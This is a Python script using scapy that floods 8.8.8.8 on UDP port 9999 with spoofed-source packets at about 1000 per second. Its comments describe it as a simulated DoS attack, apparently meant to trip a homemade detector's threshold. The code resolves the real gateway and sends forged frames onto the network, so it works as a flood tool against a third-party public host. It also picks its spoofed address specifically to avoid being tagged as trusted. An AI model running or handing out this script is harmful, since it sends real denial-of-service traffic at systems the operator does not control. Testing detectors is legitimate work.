import warnings
warnings.filterwarnings("ignore", module="cryptography")

import platform
import subprocess
import random
import time
from scapy.all import sendp, IP, UDP, Ether, conf, getmacbyip, IFACES

# ── Use the OS routing table — deterministic, no IFACES dict ordering issues ──
def get_best_iface():
    try:
        iface_name, _, _ = conf.route.route("8.8.8.8")
        return iface_name
    except Exception:
        for guid, iface in IFACES.items():
            ip = getattr(iface, 'ip', '') or ''
            if ip and ip != '127.0.0.1' and not ip.startswith('169.254.'):
                return guid
        return conf.iface

def get_gateway_mac(ip):
    if platform.system() == "Windows":
        return getmacbyip(ip)
    else:
        subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            with open("/proc/net/arp", "r") as f:
                for line in f.readlines():
                    parts = line.split()
                    if len(parts) >= 4 and parts[0] == ip:
                        mac = parts[3]
                        if mac != "00:00:00:00:00:00":
                            return mac
        except Exception:
            pass
        return None

my_iface = get_best_iface()
iface_desc = getattr(IFACES.get(my_iface, None), 'description', str(my_iface))
print(f"[*] Binding to interface: {iface_desc}")

gateway_ip = conf.route.route("0.0.0.0")[2]
gateway_mac = get_gateway_mac(gateway_ip)

if not gateway_mac:
    print(f"[!] Could not resolve MAC for gateway {gateway_ip}. Exiting.")
    exit(1)

print(f"[*] Gateway: {gateway_ip} -> MAC: {gateway_mac}")

TARGET_IP = "8.8.8.8"
TARGET_PORT = 9999
# Use a 10.x.x.x address so it is NOT tagged as trusted by the detector
fake_ip = f"10.0.0.{random.randint(1, 254)}"

print(f"[*] Starting simulated DoS attack on {TARGET_IP}...")
print(f"[*] ATTACKER IDENTITY SPOOFED AS: {fake_ip}")
print(f"[*] Firing packets out of interface: {iface_desc}")
print("[*] Press Ctrl+C to stop.")

# Build once, burst-send in an explicit loop so the rate easily
# exceeds DOS_THRESHOLD (200 pkts per 5-second window)
forged_packet = Ether(dst=gateway_mac) / IP(src=fake_ip, dst=TARGET_IP) / UDP(dport=TARGET_PORT) / b"Spoofed_DoS_Traffic"

try:
    while True:
        sendp(forged_packet, iface=my_iface, count=50, verbose=False)
        time.sleep(0.05)   # ~1000 pkts/s → far above the 200 threshold
except KeyboardInterrupt:
    print("\n[*] Attack stopped.")